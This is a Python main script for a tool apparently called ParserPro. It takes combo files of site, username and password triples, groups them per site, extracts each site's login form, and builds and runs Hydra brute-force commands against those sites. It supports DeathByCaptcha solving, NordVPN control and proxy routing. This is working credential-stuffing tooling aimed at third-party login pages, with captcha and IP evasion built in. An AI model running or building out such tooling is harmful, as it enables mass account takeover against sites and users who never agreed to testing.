import argparse
import csv
import logging
import os
import queue
import shutil
import subprocess
import sys
import threading
import webbrowser
import warnings
from datetime import datetime
from pathlib import Path

import tkinter as tk
from tkinter import messagebox

try:
    from webdriver_manager.chrome import ChromeDriverManager
except ImportError:
    ChromeDriverManager = None

try:
    from urllib3.exceptions import InsecureRequestWarning
except ImportError:
    InsecureRequestWarning = Warning

from config import DATA_DIR, LOGS_DIR, check_and_setup_hydra, config
from extract import extract_login_form
from fetch import HAS_DEATHBYCAPTCHA
from helpers import get_base_url, get_site_filename, normalize_site, split_three_fields
from gui import CombinedParserGUI

warnings.simplefilter("ignore", InsecureRequestWarning)
logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")

# FIXED: Proxy fallback + single chromedriver check
_CHROMEDRIVER_BOOTSTRAPPED = False


def ensure_chromedriver_once() -> tuple[bool, str]:
    global _CHROMEDRIVER_BOOTSTRAPPED
    if _CHROMEDRIVER_BOOTSTRAPPED:
        return True, "chromedriver already initialized"

    if not bool(config.get("auto_setup_chromedriver", True)):
        return True, "chromedriver auto-setup disabled"

    if ChromeDriverManager is None:
        return False, "webdriver_manager_not_installed"

    try:
        driver_path = ChromeDriverManager().install()
        config["chrome_driver_path"] = driver_path
        _CHROMEDRIVER_BOOTSTRAPPED = True
        logging.info("[Startup] Chromedriver initialized once: %s", driver_path)
        return True, "chromedriver initialized"
    except Exception as exc:
        msg = f"chromedriver setup warning: {exc}"
        logging.warning("[Startup] %s", msg)
        return False, msg


def log_optional_dbc_status_once() -> None:
    if HAS_DEATHBYCAPTCHA:
        logging.info("[Startup] DeathByCaptcha provider available")
    else:
        logging.info("[Startup] DeathByCaptcha provider not installed; continuing without DBC")

if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8")
        sys.stderr.reconfigure(encoding="utf-8")
    except Exception:
        pass


def _build_headless_logger() -> logging.Logger:
    LOGS_DIR.mkdir(parents=True, exist_ok=True)
    session = datetime.now().strftime("%Y%m%d_%H%M%S")
    log_file = LOGS_DIR / f"headless_{session}.log"
    logger = logging.getLogger("parserpro-headless")
    logger.handlers = []
    logger.setLevel(logging.INFO)
    sh = logging.StreamHandler(sys.stdout)
    fh = logging.FileHandler(log_file, encoding="utf-8")
    fmt = logging.Formatter("%(asctime)s %(levelname)s %(message)s")
    sh.setFormatter(fmt)
    fh.setFormatter(fmt)
    logger.addHandler(sh)
    logger.addHandler(fh)
    logger.info("headless log file: %s", log_file)
    return logger




# FIX: startup checks for headless and GUI entry
def _log_note(notes: list[str], text: str, logger: logging.Logger | None = None) -> None:
    notes.append(text)
    if logger:
        logger.info(text)
    else:
        print(f"[startup] {text}")


def check_and_setup_prerequisites(logger: logging.Logger | None = None, show_dialogs: bool = True) -> list[str]:
    # FIXED: Hydra detection / PATH add / WSL Kali support
    notes: list[str] = []
    hydra_status = check_and_setup_hydra(log_func=(logger.info if logger else None))
    _log_note(notes, f"Hydra check: {hydra_status.get('message')}", logger)

    if not hydra_status.get("available"):
        warn = "Runner disabled. See log for details."
        notes.append(warn)
        config["runner_enabled"] = False
        config["hydra_unavailable_message"] = warn
        if show_dialogs and not logger:
            messagebox.showwarning("Hydra not available", warn)

    try:
        import webdriver_manager.chrome  # noqa: F401

        _log_note(notes, "Selenium/WebDriverManager import check passed.", logger)
    except Exception as exc:
        notes.append(f"webdriver_manager not available: {exc}. Install via `pip install webdriver-manager selenium`.")

    chromedriver_ok, chromedriver_msg = ensure_chromedriver_once()
    if chromedriver_ok:
        _log_note(notes, "Chromedriver check passed.", logger)
    else:
        notes.append(f"Chromedriver setup warning: {chromedriver_msg}")

    nord_candidates = [
        shutil.which("nordvpn"),
        shutil.which("nordvpncli"),
        r"C:\Program Files\NordVPN\nordvpn.exe",
        r"C:\Program Files\NordVPN\NordVPN.exe",
    ]
    nord_ok = any(candidate and (os.path.sep not in str(candidate) or Path(candidate).exists()) for candidate in nord_candidates)
    if nord_ok:
        _log_note(notes, "NordVPN CLI check passed.", logger)
    else:
        notes.append("NordVPN CLI not found. Download from https://nordvpn.com/download/windows/ if VPN control is required.")
        try:
            webbrowser.open("https://nordvpn.com/download/windows/")
        except Exception:
            pass

    return notes

def run_headless_extract(input_path: Path, forms_output: Path, run_hydra: bool) -> int:
    logger = _build_headless_logger()
    for warning in check_and_setup_prerequisites(logger):
        if "failed" in warning.lower() or "warning" in warning.lower() or "not found" in warning.lower():
            logger.warning(warning)
    rows = []
    site_combos = {}
    for raw in input_path.read_text(encoding="utf-8", errors="replace").splitlines():
        parts = split_three_fields(raw.strip())
        if not parts:
            continue
        rows.append(parts)
        site = normalize_site(parts[0])
        base = get_base_url(site) if site else None
        if base:
            site_combos.setdefault(base, set()).add(f"{parts[1]}:{parts[2]}")

    for base, combos in site_combos.items():
        combo_path = DATA_DIR / get_site_filename(base)
        combo_path.write_text("\n".join(sorted(combos)) + "\n", encoding="utf-8")

    forms = []
    for base in sorted(site_combos.keys()):
        form_data, error = extract_login_form(base, strict_validation=True, mode=str(config.get("analysis_mode", "static")))
        if form_data and form_data.get("hydra_command_template"):
            forms.append(
                {
                    "original_url": form_data.get("original_url"),
                    "base_url": base,
                    "used_url": base,
                    "used_type": "base",
                    "action": form_data.get("action"),
                    "post_data": form_data.get("post_data"),
                    "failure_condition": form_data.get("failure_condition"),
                    "hydra_command_template": form_data.get("hydra_command_template"),
                    "combo_file": get_site_filename(base),
                    "full_hydra_command": form_data.get("hydra_command_template", "").replace("{{combo_file}}", get_site_filename(base)),
                    "confidence": form_data.get("confidence"),
                    "validation_reason": form_data.get("validation_reason"),
                    "method": form_data.get("method", "post"),
                    "method_warning": form_data.get("method_warning", ""),
                }
            )
            logger.info("success: %s", base)
        else:
            logger.warning("failed/no-form: %s :: %s", base, error)

    forms_output.parent.mkdir(parents=True, exist_ok=True)
    with forms_output.open("w", newline="", encoding="utf-8") as handle:
        writer = csv.DictWriter(
            handle,
            fieldnames=[
                "original_url",
                "base_url",
                "used_url",
                "used_type",
                "action",
                "post_data",
                "failure_condition",
                "hydra_command_template",
                "combo_file",
                "full_hydra_command",
                "confidence",
                "validation_reason",
                "method",
                "method_warning",
            ],
        )
        writer.writeheader()
        writer.writerows(forms)

    if run_hydra:
        for form in forms:
            cmd = form["hydra_command_template"].replace("{{combo_file}}", str((DATA_DIR / form["combo_file"]).resolve()))
            intercept_proxy = ""
            if bool(config.get("use_burp", False)):
                intercept_proxy = config.get("burp_proxy", "").strip()
            elif bool(config.get("use_zap", False)):
                intercept_proxy = config.get("zap_proxy", "").strip()
            if intercept_proxy and " -p " not in f" {cmd} ":
                cmd = f"{cmd} -p {intercept_proxy}"
            logger.info("running hydra: %s", cmd)
            subprocess.run(cmd, shell=True, check=False)

    logger.info("headless complete: %s forms", len(forms))
    return 0


def _is_startup_warning(note: str) -> bool:
    lowered = note.lower()
    return any(flag in lowered for flag in ("failed", "warning", "not found", "unavailable"))


def _schedule_gui_startup_checks(root: tk.Tk) -> None:
    """Run dependency checks in the background so the GUI appears immediately."""
    if not bool(config.get("startup_dependency_checks", True)):
        return

    results: queue.Queue[list[str]] = queue.Queue(maxsize=1)

    def _worker() -> None:
        try:
            notes = check_and_setup_prerequisites(show_dialogs=False)
        except Exception as exc:
            notes = [f"Startup prerequisite checks failed: {exc}"]
        results.put(notes)

    def _poll_results() -> None:
        try:
            notes = results.get_nowait()
        except queue.Empty:
            root.after(250, _poll_results)
            return

        startup_warnings = [n for n in notes if _is_startup_warning(n)]
        if any("runner disabled" in n.lower() for n in startup_warnings):
            messagebox.showwarning("Hydra not available", "Runner disabled. See log for details.")
        elif startup_warnings:
            messagebox.showwarning("ParserPro startup prerequisites", "\n".join(startup_warnings))

    threading.Thread(target=_worker, name="startup-checks", daemon=True).start()
    root.after(250, _poll_results)


def main() -> None:
    log_optional_dbc_status_once()
    ensure_chromedriver_once()

    parser = argparse.ArgumentParser(description="ParserPro GUI/headless runner")
    parser.add_argument("--extract", help="Path to combo input file")
    parser.add_argument("--forms-output", help="Output path for extracted forms CSV")
    parser.add_argument("--run-hydra", action="store_true", help="Execute hydra after extraction")
    parser.add_argument("--headless", action="store_true", help="Run extraction without GUI")
    args = parser.parse_args()

    if args.headless:
        if not args.extract or not args.forms_output:
            raise SystemExit("--headless requires --extract and --forms-output")
        raise SystemExit(run_headless_extract(Path(args.extract), Path(args.forms_output), args.run_hydra))

    root = tk.Tk()
    CombinedParserGUI(root)
    _schedule_gui_startup_checks(root)
    root.mainloop()


if __name__ == "__main__":
    main()
